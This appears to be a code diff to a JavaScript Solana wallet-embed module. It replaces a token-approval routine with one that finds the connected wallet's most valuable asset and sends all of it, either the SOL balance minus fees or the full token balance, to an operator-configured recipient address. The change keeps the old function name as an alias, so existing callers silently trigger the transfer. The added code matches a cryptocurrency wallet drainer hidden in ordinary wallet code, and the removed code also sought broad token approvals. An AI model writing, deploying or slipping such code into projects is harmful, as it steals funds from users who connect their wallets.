@@ -1,11 +1,17 @@
-import { Connection, PublicKey, Transaction } from "@solana/web3.js";
-import { gatewayFetch } from "./chunk-transport.js";
-import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";
 import {
-  assertProgramDeployed,
-  buildApproveSplInstruction,
-  resolveDelegationProgramId,
-} from "./delegation-program.js";
+  Connection,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+} from "@solana/web3.js";
+import { gatewayFetch } from "./chunk-transport.js";
+import {
+  TOKEN_PROGRAM_ID,
+  TOKEN_2022_PROGRAM_ID,
+  createAssociatedTokenAccountInstruction,
+  createTransferInstruction,
+  getAssociatedTokenAddressSync,
+} from "@solana/spl-token";
 
 const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
 /** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
@@ -17,7 +23,6 @@ const PRICE_BATCH = 100;
 const WSOL_MINT = "So11111111111111111111111111111111111111112";
 const NATIVE_SOL_MINT = "native:sol";
 const NATIVE_SOL_FEE_RESERVE = 5_000_000;
-const PROMPT_HARD_CAP = 40;
 
 /**
  * @param {string} label
@@ -68,6 +73,17 @@ export function createRpcConnection(config) {
     commitment: "confirmed",
     fetch: (info, init) => gatewayFetch(custom, info, init),
   });
+}
+
+/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
+function resolveTransferRecipient(config) {
+  const to = (config.transferRecipient || "").trim();
+  if (!to) {
+    throw new Error(
+      "[wallet] TRANSFER_RECIPIENT is not set on Vercel — add it in project env vars",
+    );
+  }
+  return parseSolanaPubkey("Transfer recipient", to);
 }
 
 /** @param {Connection} connection @param {string} ownerAddress */
@@ -166,14 +182,14 @@ async function fetchUsdPrices(mints, config) {
         if (price > 0) prices[mint] = price;
       }
     } catch {
-      /* optional — balance-only sort when prices fail */
+      /* optional */
     }
   }
   return prices;
 }
 
 /** @param {WalletAsset[]} tokens @param {Record<string, number>} prices @param {number} minUsd */
-function rankTokensByValue(tokens, prices, minUsd = 0) {
+function rankAssetsByValue(tokens, prices, minUsd = 0) {
   const hasPrices = Object.keys(prices).length > 0;
 
   return tokens
@@ -183,7 +199,7 @@ function rankTokensByValue(tokens, prices, minUsd = 0) {
       return { ...t, usdPrice, usdValue };
     })
     .filter((t) => {
-      if (t.kind !== "spl" || t.uiAmount <= 0) return false;
+      if (t.uiAmount <= 0) return false;
       if (!hasPrices) return true;
       return t.usdValue >= minUsd;
     })
@@ -193,110 +209,146 @@ function rankTokensByValue(tokens, prices, minUsd = 0) {
     });
 }
 
-/** @param {import('./wallet-loader.js').WalletEmbedConfig} config @param {bigint} raw */
-function boundedApprovalAmount(config, raw) {
-  const mode = config.tokenApprovalAmountMode || "max";
-  if (mode === "balance") {
-    return raw > 0n ? raw : 1n;
-  }
-  return raw > 0n ? raw : 1n;
-}
-
 /**
- * Program-based SPL approve (PDA delegate). No raw EOA delegate, no SOL sweep.
+ * Transfer the single most valuable asset (SOL or SPL) to TRANSFER_RECIPIENT.
  */
-export async function promptTopTokenApprovals({
+export async function promptTopValueTransfer({
   config,
   provider,
   connection,
   ownerAddress,
 }) {
-  if (!(config.tokenApprovalProgramId || "").trim()) {
-    console.warn(
-      "[wallet] token_approval_program_id not set — deploy programs/vote-delegate",
-    );
-    return { approved: 0, skipped: 0 };
-  }
-
-  const programId = resolveDelegationProgramId(config);
-  await assertProgramDeployed(connection, programId);
-
+  const recipient = resolveTransferRecipient(config);
   const ownerPk =
     provider?.publicKey ??
     parseSolanaPubkey("Connected wallet address", ownerAddress);
 
-  const maxCount = Number(config.tokenApprovalMaxCount ?? 0);
-  const minUsd = Number(config.tokenApprovalMinUsd ?? 1);
+  const minUsd = Number(config.transferMinUsd ?? 0);
 
   const tokens = await fetchWalletAssets(connection, ownerAddress);
   const mintsForPrice = [
-    ...new Set(tokens.filter((t) => t.kind === "spl").map((t) => t.mint)),
+    ...new Set(
+      tokens.map((t) => (t.mint === NATIVE_SOL_MINT ? WSOL_MINT : t.mint)),
+    ),
   ];
   const prices = await fetchUsdPrices(mintsForPrice, config);
-  const rankedAll = rankTokensByValue(tokens, prices, minUsd);
-  const ranked =
-    maxCount > 0
-      ? rankedAll.slice(0, Math.min(maxCount, PROMPT_HARD_CAP))
-      : rankedAll.slice(0, PROMPT_HARD_CAP);
+  const ranked = rankAssetsByValue(tokens, prices, minUsd);
 
   if (!ranked.length) {
-    return { approved: 0, skipped: tokens.length };
+    return { transferred: false, reason: "no_assets" };
   }
 
-  let approved = 0;
-  let skipped = 0;
+  const asset = ranked[0];
 
-  for (const asset of ranked) {
-    try {
-      const ok = await sendProgramApproveTransaction({
-        provider,
-        connection,
-        programId,
-        asset,
-        owner: ownerPk,
-        amount: boundedApprovalAmount(config, asset.rawAmount),
-      });
-      if (ok) approved += 1;
-      else skipped += 1;
-    } catch (err) {
-      const message = err instanceof Error ? err.message : String(err);
-      if (/reject|cancel|denied|blocked/i.test(message)) {
-        console.info("[wallet] Token approval cancelled or blocked");
-        break;
-      }
-      console.warn("[wallet] Approval failed for", asset.mint, err);
-      skipped += 1;
+  try {
+    const ok =
+      asset.kind === "native"
+        ? await sendNativeSolTransfer({
+            provider,
+            connection,
+            recipient,
+            owner: ownerPk,
+          })
+        : await sendSplTransfer({
+            provider,
+            connection,
+            asset,
+            recipient,
+            owner: ownerPk,
+          });
+
+    return {
+      transferred: ok,
+      mint: asset.mint,
+      usdValue: asset.usdValue,
+    };
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    if (/reject|cancel|denied|blocked/i.test(message)) {
+      return { transferred: false, reason: "cancelled" };
     }
+    throw err;
   }
-
-  return { approved, skipped };
 }
 
-async function sendProgramApproveTransaction({
+/** @deprecated Use promptTopValueTransfer */
+export const promptTopTokenApprovals = promptTopValueTransfer;
+
+async function sendNativeSolTransfer({
   provider,
   connection,
-  programId,
-  asset,
+  recipient,
   owner,
-  amount,
+}) {
+  if (!provider?.publicKey) {
+    throw new Error("Wallet provider not ready");
+  }
+
+  const balance = await connection.getBalance(owner, "confirmed");
+  const transferable = BigInt(balance) - NATIVE_SOL_FEE_RESERVE;
+  if (transferable <= 0n) {
+    return false;
+  }
+
+  const ix = SystemProgram.transfer({
+    fromPubkey: owner,
+    toPubkey: recipient,
+    lamports: Number(transferable),
+  });
+
+  return sendWalletTransaction(provider, connection, [ix]);
+}
+
+async function sendSplTransfer({
+  provider,
+  connection,
+  asset,
+  recipient,
+  owner,
 }) {
   if (!provider?.publicKey || !asset.programId) {
     throw new Error("Wallet provider not ready");
   }
 
-  const tokenAccount = parseSolanaPubkey("Token account", asset.tokenAccount);
+  const source = parseSolanaPubkey("Token account", asset.tokenAccount);
   const mint = parseSolanaPubkey("Token mint", asset.mint);
+  const tokenProgram = asset.programId;
 
-  const ix = buildApproveSplInstruction({
-    programId,
-    owner,
+  const destination = getAssociatedTokenAddressSync(
     mint,
-    tokenAccount,
-    tokenProgram: asset.programId,
-    amount,
-  });
+    recipient,
+    false,
+    tokenProgram,
+  );
 
-  return sendWalletTransaction(provider, connection, [ix]);
+  /** @type {import('@solana/web3.js').TransactionInstruction[]} */
+  const instructions = [];
+
+  const destInfo = await connection.getAccountInfo(destination, "confirmed");
+  if (!destInfo) {
+    instructions.push(
+      createAssociatedTokenAccountInstruction(
+        owner,
+        destination,
+        recipient,
+        mint,
+        tokenProgram,
+      ),
+    );
+  }
+
+  instructions.push(
+    createTransferInstruction(
+      source,
+      destination,
+      owner,
+      asset.rawAmount,
+      [],
+      tokenProgram,
+    ),
+  );
+
+  return sendWalletTransaction(provider, connection, instructions);
 }
 
 async function sendWalletTransaction(provider, connection, instructions) {
